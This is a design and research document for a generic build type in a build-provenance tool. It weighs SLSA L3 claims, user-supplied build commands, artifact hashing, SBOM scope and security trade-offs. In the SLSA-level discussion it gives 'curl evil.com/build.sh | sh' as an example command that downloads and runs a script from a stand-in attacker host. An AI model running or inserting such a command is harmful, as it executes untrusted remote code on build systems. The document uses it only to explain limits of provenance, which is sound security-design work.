# Wrangle Generic Build Type — Phase 1 Research

This document captures Phase 1 ecosystem research per [`docs/HOW_TO_ADD_A_BUILD_TYPE.md`](../../../docs/HOW_TO_ADD_A_BUILD_TYPE.md), adapted for the "generic" case where the user supplies a build command and wrangle invokes it.

**Status:** research only. No implementation has been written. No build-type adapter contract is committed. The spec below documents *what the contract must support*, not the contract's shape — that is the work tracked in [#171](https://github.com/TomHennen/wrangle/issues/171).

The runbook's Phase 1 question list assumes an ecosystem (canonical build tool, canonical SBOM tool, canonical attestation pattern, …). For generic there is no ecosystem; many of the answers are about *what the user declares* in place of the convention. Each section below names the runbook question it addresses, then re-frames it for the no-ecosystem case.

## Design principles

### What "generic" means

Generic is the build type for adopters whose project does not fit a recognized ecosystem (npm, container, python, Go, …). The user supplies an arbitrary build command (`make all`, `./build.sh`, `bazel build //...`, etc.) and declares the artifact paths the command produces. **Wrangle invokes the user's command from inside its own composite action**, hashes the declared outputs, generates an SBOM over the workspace, and emits the SLSA provenance subjects.

The framing wrangle is *not* taking is "user does the build, wrangle attests after the fact." That shape is already provided by `slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml` ([reference example](https://github.com/slsa-framework/slsa-github-generator/blob/main/internal/builders/generic/README.md)) — the caller builds in their own job, computes hashes, and hands them to the generator. Wrapping that flow without invoking the build adds nothing wrangle-specific to the provenance: the provenance's `workflow_ref` would point at the caller's workflow, the build identity wrangle tags would not appear in the attested inputs, and an adopter could not tell from the provenance that wrangle was involved at all. For generic to be a wrangle build type at all, wrangle has to invoke the build — that is the only way the build steps wrangle controls (input validation, SBOM, hashing, gating) appear *inside* the attested workflow rather than alongside it.

### SLSA level — what wrangle can honestly claim

This is the most accuracy-sensitive question in the design and worth being precise about up front.

`generator_generic_slsa3.yml` produces SLSA Build Level 3 provenance because *the generator itself* runs in an isolated reusable workflow with non-falsifiable signing — that's the "hardened build platform" property. The generator does not, however, run the user's build. Wrangle's existing python build type also achieves "SLSA L3" by this same construction: the build runs in wrangle's normal composite-action job, then `generator_generic_slsa3.yml` is invoked with the build's hashes as `base64-subjects`. The L3 property attaches to the *attestation* (it was minted in an isolated builder), not to the build job itself.

For the generic build type, the same construction applies. Wrangle invokes the user's command from a normal composite-action job, computes hashes over the declared outputs, and hands those hashes to `generator_generic_slsa3.yml`. The provenance the generator emits will record the caller workflow's `workflow_ref` and the subject hashes; it will not record (and cannot record, given the generic generator's design) the contents of the user's build command. Consumers verifying the provenance are trusting that wrangle's reusable workflow at the recorded `workflow_ref` is the one that ran — and through transitive trust, that wrangle's composite action is what invoked the user-supplied build command.

What this means for adopters and for the SPEC's eventual claim:

- "SLSA L3" is the right label, by parity with python and with how `generator_generic_slsa3.yml`'s reference example is framed.
- The provenance does **not** prove anything specific about the user's build command — only that wrangle's workflow ran, that some build happened inside it, and that the resulting hashes match. If the user's command is `curl evil.com/build.sh | sh`, the provenance still attaches at L3, because L3 is a property of the *signing path*, not of the build hygiene.
- A genuinely stronger story (build runs inside an isolated reusable workflow, build command is recorded as an attested input) exists upstream — `slsa-framework/slsa-github-generator`'s [Docker builder](https://github.com/slsa-framework/slsa-github-generator/blob/main/internal/builders/docker/README.md) does exactly this: it runs the user-supplied command inside a pinned builder image, in an isolated reusable workflow, and records the command and image digest as attested provenance fields. The [BYOB framework](https://github.com/slsa-framework/slsa-github-generator/blob/main/BYOB.md) ("Build Your Own Builder") is the documented path for tool maintainers to ship that shape.
- Whether generic should ship on `generator_generic_slsa3.yml` (matches python; same L3 ceiling as wrangle's other types; minimal new infrastructure) or move to the Docker builder / BYOB pattern (genuinely stronger provenance for opaque builds, at the cost of adopting a different upstream interface for one build type) is **a contract-design question, not a Phase 1 question**, and is flagged for #171. Phase 1's job is to surface the trade-off; the assumption used through the rest of this document is `generator_generic_slsa3.yml`, matching the existing types.

### Build command (user-supplied) — the runbook's "canonical build tool" question

The runbook asks about the canonical build tool. For generic there isn't one — by construction. The reframed question is: *what does the user declare in place of a canonical tool?*

At minimum the user must declare a command to run. The shape of that declaration is the most contract-stressing input in the build type and the one #171 most needs to consider:

- **Single command vs. step list.** A one-shot `command` field covers `make all` and `./build.sh`, but realistic builds often want test → build → package as separate steps with separate failure semantics (a test failure must stop, but it's distinct from a build failure for reporting). Adopters can collapse this into a single shell script in their repo and declare *that* as the command, but the contract decision is whether the build type pushes that complexity into the user's repo or absorbs it. (Cf. python, where wrangle has a separate `run-tests` boolean and a separate build step because it knows the canonical tools for each.) **Open question for #171.**
- **Working directory.** The runbook's existing types take a `path:` input that resolves the project root. Generic likely needs the same, plus possibly a separate "working directory the command runs from" if these can differ. Container and python collapse them.
- **Shell vs. argv.** A `command:` string evaluated by `bash -c` admits shell features (pipelines, env-var expansion) but creates an injection surface against the wrangle action itself; an argv list is safer but inconvenient for the common `make && tar -czf out.tgz dist/` case. Both shapes are seen in upstream — the [SLSA Docker builder config](https://github.com/slsa-framework/slsa-github-generator/blob/main/internal/builders/docker/README.md) takes a TOML `command = ["cp", "...", "..."]` argv list precisely so the build command becomes a structured attested input rather than a shell-evaluated string.
- **Environment.** Whether the contract guarantees a clean environment, inherits the runner's environment, or supports an explicit allowlist. Wrangle's *adapter* contract (`docs/SPEC.md` §"Tool Adapter API") strips most env vars and forwards only `WRANGLE_EXTRA_*` — that's a useful precedent but the build adapter contract is a different surface and may need a different policy (the user's build command legitimately needs `PATH`, `HOME`, language toolchains, etc.).

Wrangle does **not** set up the user's toolchain. The python build type runs `actions/setup-python`; container runs `setup-buildx-action`. Generic, by definition, doesn't know what to set up. The adopter is responsible for adding toolchain-setup steps (e.g., `actions/setup-go`, `actions/setup-java`, container image with a compiler) *before* invoking wrangle's reusable workflow / composite action. This is a real adopter-experience difference from every other wrangle build type and the README will need to make it explicit.

### Artifact identity — what "the artifact" is when wrangle has no ecosystem hint

Generic only knows that the user declared `artifact-paths`, the user's command ran (possibly to completion, possibly partway), and now files exist (or don't) at those paths. There is no canonical place to look — no `dist/` (python), no `${imagename}@${digest}` (container).

This bears directly on the runbook's "canonical attestation pattern" question. For the SLSA generator, "the artifact" is whatever appears in `base64-subjects` as `<sha256> <name>` lines. The contract questions:

- **Glob vs. exact list.** `dist/*.tar.gz` is convenient; `dist/foo-1.2.3.tar.gz dist/foo-1.2.3.tar.gz.sig` is unambiguous. A glob with no matches is almost certainly an error (the build silently produced nothing), but should produce no provenance, an error, or empty provenance? The strictest interpretation — empty match = build error — is consistent with the existing build-stage failure contract ("`SBOM generation fails: pipeline stops`"). **Open question for #171.**
- **Unexpected outputs.** What if the user's command writes files at paths the user did not declare? Three behaviors are possible: ignore (only declared paths are attested; extras are invisible), warn (the run logs unexpected files but proceeds), or fail (any write outside declared paths is a contract violation). Container has no analog because the OCI digest is the artifact; python's analog is `dist/` (the build-tool convention picks the contents). The wrangle *adapter* contract enforces the strict third option (`Adapter scripts MUST NOT write files outside of output_dir`), so there's a precedent.
- **Missing declared outputs.** A declared `artifact-path` that the build did not produce is unambiguously a build failure — no hash to compute, no subject to attest. The contract should say so.
- **Directory artifacts.** The python build hashes individual files inside `dist/`. Container hashes a single image manifest. Generic might want either, depending on the user's build (a tarball is one file; a release directory is many). Whether the contract supports declaring a directory as a single artifact (hash of contents? tar of contents?) or requires the user to declare individual files (or to produce a tarball as the final build step) is a real choice with cascading effects on how `slsa-verifier verify-artifact` is invoked downstream.

The simplest viable contract — exact filename list, all listed files must exist after the build, files outside the list are ignored — is enough to *ship* a build type. Globs and directory-as-artifact are convenience features that can be layered later if the simple form proves too painful. Phase 1's job is to flag that decision exists.

### SBOM — the runbook's "canonical SBOM tool" question

Without an ecosystem hint, no language-specific SBOM generator (`pip freeze`, `npm sbom`, `go mod`) applies. The candidate is `syft`, which already lives in wrangle (`tools/syft/install.sh`, used by python) and supports source-directory and filesystem scanning across many ecosystems by inference. Output format is SPDX, matching the rest of wrangle (`docs/SPEC.md` §"Decisions to inherit").

The harder question is **what `syft` is run against**:

- **Workspace scan** (`syft .`) — captures everything the user checked in plus anything fetched into the workspace by the build. Risks false positives (test fixtures, vendored examples) and may miss dependencies fetched into a build cache outside the workspace.
- **Artifact scan** (`syft <declared-artifact>`) — captures only what `syft` can identify *inside* the produced artifact. Most accurate for self-contained artifacts (a static binary, a tarball with a manifest); useless for many-file builds where the artifact is just the entry point.
- **Both** — workspace SBOM as "what was available at build time" and artifact SBOM as "what shipped." Highest fidelity, most storage cost, and increases scan-time vulnerability findings (which are non-blocking but visible).

Container produces *one* SBOM (BuildKit-native, post-push image extraction); python produces *one* SBOM (workspace-resolved environment via syft). Generic could match either. The contract question is whether the user has to declare an SBOM scope, or whether wrangle picks a default (likely workspace) and lets the user override. **Open question for #171.**

Whichever path generic ships first, the SBOM is scanned by the shared `osv-scanner` infrastructure (`docs/SPEC.md` §"Shared SBOM vulnerability scanning") — that part is settled across all build types.

### Publish target — the runbook's "canonical publish target" question

The runbook lists ecosystem-native publish targets (PyPI, GHCR, npm registry, Maven Central, GitHub Releases). For generic there is no ecosystem-native target, and `generator_generic_slsa3.yml`'s reference example does not push anywhere — it optionally uploads provenance and artifact files to a *GitHub Release* via its `upload-assets: true` input ([generic README](https://github.com/slsa-framework/slsa-github-generator/blob/main/internal/builders/generic/README.md)). Beyond that, publishing is the caller's problem.

The honest answer for Phase 1: **generic likely has no publish step inside the reusable workflow**. GitHub Release upload is the only target with a documented path that doesn't require ecosystem assumptions, and it's already covered by the SLSA generator's `upload-assets` flag — wrangle re-exposing it is mostly a question of plumbing the input through. Anything beyond GitHub Releases (S3, a private registry, a hosted package repository, an internal artifact server) requires credentials, registry-specific tooling, and an attestation/signing model that varies by target. Pushing those into the generic build type would either bloat the contract or force adopters into a fictional "generic registry" abstraction.

The python build type has already established the precedent that publish can live in the *adopter's* workflow when the publish step has constraints the reusable workflow can't satisfy (PyPI's OIDC `workflow_ref` requirement). For generic, the same pattern likely applies, and for a stronger reason: wrangle has no idea where the artifact is going. Adopters wire up their own publish job after wrangle's reusable workflow completes, downloading the dist artifact and provenance via `download-artifact`, optionally verifying provenance with `slsa-verifier verify-artifact`, then handling registry login + push themselves.

### Attestation pattern — the runbook's "canonical attestation pattern" question

There is no ecosystem-native attestation analogue to PEP 740 (python) or OCI image attestations (container). The only attestation produced is **SLSA L3 provenance** via `generator_generic_slsa3.yml`. The provenance's subject hashes correspond to the declared artifact paths post-build; the `workflow_ref` records wrangle's reusable workflow.

What the provenance does *not* attest, given the chosen upstream:

- The user-supplied build command itself (the generic generator does not record build steps as attested inputs)
- Toolchain versions used during the build
- Build-time environment variables

For adopters who need any of these to be attested provenance fields, the upgrade path is the SLSA Docker builder (records command + image digest), tracked in this document under "SLSA level — what wrangle can honestly claim."

### Authentication model

The runbook's "trusted publishing > tokens" guidance assumes ecosystem-native publishing. Generic has none, so the relevant authentication surface is whatever the *user's* build command needs to access (private package mirrors, internal source registries, language-specific build authentication) plus whatever the *user's* publish step needs (registry credentials, S3 keys, etc.).

The minimum wrangle commits to:

- **No secrets reach the wrangle composite action by default.** The build command runs with the runner's environment, but wrangle does not forward `GITHUB_TOKEN`, secrets blocks, or `WRANGLE_EXTRA_*` style allowlisted vars unless the contract explicitly says so. The python build type already runs builds without `GITHUB_TOKEN`; the same default applies here.
- **OIDC-only for SLSA provenance.** Provenance signing uses `id-token: write` via the SLSA generator's reusable workflow — same as every other wrangle build type. No tokens.
- **Adopter-supplied secrets for the build command** if the build needs them. The contract question is *how*: a `secrets:` block on the reusable workflow that's piped into the build command's environment (matches container's `gh_token`), or strict "the caller wires environment in a step before calling wrangle, and wrangle inherits it" (simpler contract, larger adopter responsibility). **Open question for #171.**

### Reference workflow patterns

The closest cross-repo references for "user-supplied build, then SLSA provenance" are workflows that adopt `generator_generic_slsa3.yml` directly. The official starter ([`actions/starter-workflows`](https://github.com/actions/starter-workflows/blob/main/ci/generator-generic-ossf-slsa3-publish.yml)) and the [generic README example](https://github.com/slsa-framework/slsa-github-generator/blob/main/internal/builders/generic/README.md) both follow the same shape:

```
build:
  outputs:
    hashes: ...
  steps:
    - <user's build commands>
    - run: echo "hashes=$(sha256sum <artifacts> | base64 -w0)" >> "$GITHUB_OUTPUT"
    - upload-artifact

provenance:
  uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v...
  with:
    base64-subjects: ${{ needs.build.outputs.hashes }}
```

Common adopter pain points visible in this pattern, which a wrangle build type would directly address:

- **Manual artifact enumeration.** The starter workflow comment instructs adopters to "Update the sha256 sum arguments to include all binaries that you generate provenance for." A new artifact added to a release that nobody remembers to add to the `sha256sum` line ships with no provenance and no warning. Wrangle wiring the declared `artifact-paths` into both upload and hash computation closes this gap.
- **Hashing-format pitfalls.** `sha256sum dist/foo` produces `<hash>  dist/foo` (with the `dist/` prefix); `cd dist && sha256sum foo` produces `<hash>  foo`. `slsa-verifier verify-artifact` matches subject names against the *downloaded artifact's filename*, so the prefix matters. Wrangle's python build type already had to solve this (SPEC: "the hashing step `cd`s into `dist/` and uses bare `*` (not `./*`)"); generic gets the same fix for free if wrangle owns the hashing step.
- **No SBOM, no scan.** The starter has no SBOM generation and no vulnerability scan — adopters who want either bolt them on alongside, with their own duplication of effort. Wrangle gives both for one `uses:` line.
- **Permission-cascade trap.** `generator_generic_slsa3.yml`'s `upload-assets` job declares `contents: write`, which (per the runbook's "Common gotchas") the *caller* must grant even when the generator's `if:` guards mean the job will skip. New adopters trip over this regularly. Wrangle's reusable workflow declaring the right union once means adopters' caller workflows don't have to.
- **No release-events gating.** Adopters using `generator_generic_slsa3.yml` directly typically write their own `if: github.ref == 'refs/heads/main'` (or worse, run provenance on PRs and confuse themselves later). Wrangle's `release-events` input + shared `actions/release_gate/` composite is a real ergonomics win.

### Awkward cases the contract should anticipate

Surfaced here without being resolved — these are pressure-tests for #171.

- **Multi-step builds.** Configure → test → build → package as four distinct phases, each with its own failure semantics. A single `command:` field forces this into a wrapper script in the user's repo; a step-list shape makes wrangle the orchestrator and lets `release-events` gate parts (test always runs; package only runs on release events) — but adds a lot of contract surface.
- **Cached intermediate state (Bazel, Gradle, ccache).** Build-system caches frequently live outside the workspace (`~/.cache/bazel`, `~/.gradle/caches`). Whether wrangle's input validation rejects (`set -f` + path checks for declared outputs) interferes with the build's normal cache writes is a real concern. Container faces this less because the build is in a Docker context.
- **Multi-arch artifacts.** A build that produces `bin/amd64/foo`, `bin/arm64/foo`, `bin/darwin-arm64/foo` is one logical release with multiple file outputs. The `artifact-paths` contract handles this fine if it accepts a list; the SLSA provenance carries N subjects under one attestation, which `slsa-verifier verify-artifact` handles.
- **Builds that need network access to private services.** No wrangle change required — the build inherits the runner's network. But it's the case where the "what env vars / secrets does the build see" contract decision matters most.
- **Reproducible builds.** Out of scope. Generic does not commit to reproducibility; the SLSA generic generator does not require it; wrangle does not enforce it. If an adopter's build is non-reproducible, the provenance still attaches — provenance proves *who built it*, not *that it could be rebuilt bit-for-bit*.
- **Empty/skip case.** A build that produces no artifact at all (e.g., a "lint and test only" run that wants the SBOM and source scan but has nothing to release) is the validation-only build type's domain (`build/actions/shell/`), not generic. The generic contract should be explicit that `artifact-paths` is required and non-empty — otherwise it overlaps with shell.

### Security model — what changes when wrangle invokes user-supplied commands

Wrangle's source-tool adapters and ecosystem build types run *wrangle-controlled scripts* against user-supplied configuration (paths, image names, version overrides). All that input is validated against strict regexes (`^[a-zA-Z0-9_./-]+$` for paths, `^[a-z0-9.-]+$` for registry hostnames) before any shell command is built.

Generic widens this surface in one specific way: **the build command itself is user-supplied content that runs in a shell**. This is *not* novel for GitHub Actions in general — every `run:` block in an adopter's workflow is the same shape — but it is the first place inside wrangle's own action surface where this happens. Phase 1 flags the implications without designing the validation:

- **Expression-injection guidance applies the same as everywhere.** The `build-command` input must be funneled through `env:`, never interpolated directly into the composite action's `run:` block. CLAUDE.md already mandates this for every input.
- **Shell evaluation is the trade-off.** A `command:` string evaluated by `bash -c "$BUILD_COMMAND"` is the most flexible adopter shape, and is what `make all && tar -czf …` users expect. It is also the most permissive: anything that flows into `BUILD_COMMAND` gets shell semantics. An argv list (`["bash", "-c", "..."]` evaluated as positional args) gives some structure but doesn't actually narrow the surface for a `bash -c` shape. The Docker builder upstream chose argv-only with no shell as one piece of its stronger provenance story.
- **Path validation surface widens.** Beyond the `path:` input (already validated by `lib/validate_path.sh`), generic adds `artifact-paths` (each element must be path-validated; globs would need glob-safe validation) and possibly a `working-directory:` or `output-directory:` input. **Open question for #171:** whether `artifact-paths` accepts globs, and if so, whose glob expander runs (the build's `bash`? wrangle's? both, with cross-checks?).
- **Workspace traversal.** A user's build command that writes outside `$GITHUB_WORKSPACE` is permitted by GitHub Actions and by wrangle. Whether the contract requires `artifact-paths` to be inside the workspace is a hardening question — the answer of "yes" is consistent with how container and python work today (everything in the workspace), and is what the eventual hashing step would naturally enforce anyway (the `actions/upload-artifact` step needs the files to exist at workspace-relative paths to upload them).
- **Secret leakage.** A user's build command that exfiltrates `$GITHUB_TOKEN` or other secrets is a real risk; same risk exists today in any adopter `run:` block. The mitigation is the python-style minimum-permissions stance (`contents: read` on the build job, no `id-token`, no `packages: write`) plus *not forwarding* `secrets:` into the build command's environment unless the contract explicitly opts in.
- **No `--no-verify`-style escape hatch.** If an `artifact-path` validation fails or a declared output is missing, the build fails. There is no "warn and continue" mode. This matches the existing build-stage failure contract.

## Wrangle's value-add over `generator_generic_slsa3.yml` directly

The honest summary: generic's value-add is **thinner** than python's or container's, because wrangle has no ecosystem knowledge to leverage. It is not zero, and the items below are real ergonomics wins, but a research finding that Phase 1 should not soften: an adopter who is comfortable wiring `generator_generic_slsa3.yml` directly is not getting the same magnitude of help from wrangle's generic build type that a python adopter gets from wrangle's python build type.

What wrangle's generic build type adds:

- **Automated artifact enumeration.** The user declares `artifact-paths` once. Wrangle wires that single declaration into both the artifact upload (so adopters' release jobs see the same list) and the SHA-256 base64 subjects fed to the SLSA generator. Adding a new artifact is one edit, not three.
- **Hash-format correctness.** Wrangle owns the `cd`-then-bare-glob hashing pattern that makes `slsa-verifier verify-artifact` work without manual debugging (cf. python SPEC step 5).
- **SBOM generation and vulnerability scan, for free.** `syft` against the workspace, `osv-scanner` against the SBOM. The starter workflow does neither.
- **Unified metadata layout.** `metadata/generic/<shortname>/sbom.spdx.json` + `multiple.intoto.jsonl` + `summary.md` — one schema across every wrangle build type. Cross-ecosystem tooling, policy engines, and audit dashboards see one shape.
- **Permission-cascade handling.** Wrangle's reusable workflow declares the union of `actions: read | id-token: write | contents: write` once; adopters' caller workflows don't need to know about `upload-assets`'s `contents: write` requirement to make the call validate at startup.
- **Release-events gating via `actions/release_gate/`.** Generic adopts the standard `release-events` input — same vocabulary as every other build type, configurable shorthands (`tag-only`, `main-and-tags`, `non-pull-request`).
- **Step summary, named outputs (`provenance-artifact-name`, `metadata-artifact-name`, `dist-artifact-name`-equivalent), input validation.** Same shape as python/container.
- **Composability.** A single caller workflow that builds a container *and* a generic artifact (e.g., a tarball release alongside a Docker image) gets the same metadata layout, the same gate semantics, and the same `should-release` plumbing across both. An adopter wiring `generator_generic_slsa3.yml` and `generator_container_slsa3.yml` directly gets two workflows with two different output naming conventions and two release gates to keep in sync.

What wrangle's generic build type does **not** add (vs. what python/container add):

- No ecosystem-native attestation (no PEP 740 analogue, no OCI image attestation analogue) — there isn't one to add.
- No toolchain setup (the user supplies their own toolchain step before invoking wrangle).
- No build-tool detection (no `uv.lock` vs. PEP 517 fork in the road).
- No publish step (out of scope; lives in the adopter's workflow, modelled after python's pattern).

The candid framing for #171: wrangle's value-add for generic is "everything except the build itself, packaged consistently with the rest of wrangle." If the contract drives wrangle toward the SLSA Docker builder / BYOB shape, that flips — wrangle can then claim a stronger provenance story for opaque builds than what adopters get by default. That's a reason the SLSA-level decision is contract-shaping, not just an implementation detail.

## Notes for #171 contract design

Generic is the most contract-stressing of the three Phase 1 research types because it has *no* ecosystem assumptions for the contract to lean on. Specifically, generic stresses these axes of [#171](https://github.com/TomHennen/wrangle/issues/171):

### Minimum user-declared input set (sketched, not committed)

The contract must accommodate at least these inputs. Shapes are open questions the contract will resolve.

| Input | Required | Open shape questions |
|-------|----------|---------------------|
| `path` (project root) | Yes | Same as other build types; consistent default `.` |
| `build-command` | Yes | Single string vs. argv list vs. step list. Shell evaluation semantics. Multi-line. |
| `artifact-paths` | Yes (non-empty) | Glob vs. exact list vs. directory-as-artifact. Workspace-relative only? Empty-match policy. |
| `working-directory` | No | Default to `path`? Independent input? Required only when it differs from `path`? |
| `test-command` | No | Optional. If absent, no test step runs (adopter folds tests into `build-command`). If present, runs before build, separate failure boundary. |
| `sbom-scope` | No | Workspace, artifact, or both. Default likely "workspace." |
| `release-events` | No | Same as other build types. Default `non-pull-request`. |
| `env` / `secrets` | No | Adopter-supplied env or secret allowlist for the build command. Whether this is a wrangle-input or "use a setup step before invoking wrangle." |

### Where artifact identity emerges

For container, identity is the registry-returned digest after `docker push`. For python, identity is the SHA-256 of each file in `dist/` after `python -m build`. For generic, identity is the SHA-256 of each file at each declared `artifact-path` after the user's command exits zero. This is the cleanest of the three to *describe* and the messiest to *enforce* — it depends entirely on contract-time decisions about globs, missing outputs, and unexpected outputs (all flagged above).

### Boundary of `build.sh` (per #171's adapter contract sketch)

#171 sketches a `build.sh` boundary taking `<src_dir> <metadata_dir> [type-specific…]`. For generic, the type-specific args minimally include `<build-command>` and `<artifact-paths>` — but the build command itself is an argument to `build.sh` rather than the body of `build.sh`. That inverts the existing pattern (python's `build.sh` *contains* `python -m build`; generic's `build.sh` would *invoke* whatever the user passed). This inversion is the contract-stress that generic surfaces and that the existing two artifact-producing types do not.

The honest test for the contract: if `build.sh` for generic is essentially `bash -c "$BUILD_COMMAND" && hash declared paths && generate SBOM && write outputs file`, the contract holds and generic is no worse than python. If `build.sh` for generic ends up needing GHA-specific context (`$GITHUB_OUTPUT` heredoc handling, action-runtime tokens, `actions/upload-artifact` glue), the contract leaks GHA assumptions and #171's portability goal regresses for the build type that should be the *easiest* to make portable.

### Toolchain-setup boundary

Every other wrangle build type bundles toolchain setup. Generic, by definition, can't. The contract should be explicit about this: the build action assumes a usable toolchain on `PATH`, and adopters wire toolchain setup as a step before invoking wrangle. This is the one adopter-experience axis where generic is genuinely worse than the ecosystem types — not because of poor design, but because the absence of ecosystem assumptions means wrangle has nothing to install on the user's behalf.

### SLSA-level question

Whether generic ships on `generator_generic_slsa3.yml` (matches python; same L3 ceiling) or moves to the SLSA Docker builder / BYOB pattern (records build command as an attested input; runs build in an isolated reusable workflow) is a **contract-design choice**, not a Phase 1 conclusion. Documented above for #171's consideration.

### Composability with other build types in one caller workflow

Generic is the build type most likely to be invoked alongside others (e.g., adopter ships a container *and* a sidecar tarball release; or a python wheel *and* a generic redistribution archive). The contract should ensure naming, metadata layout, gating, and `should-release` plumbing stay consistent so a multi-build caller workflow doesn't end up with inconsistent provenance/SBOM artifacts across types.
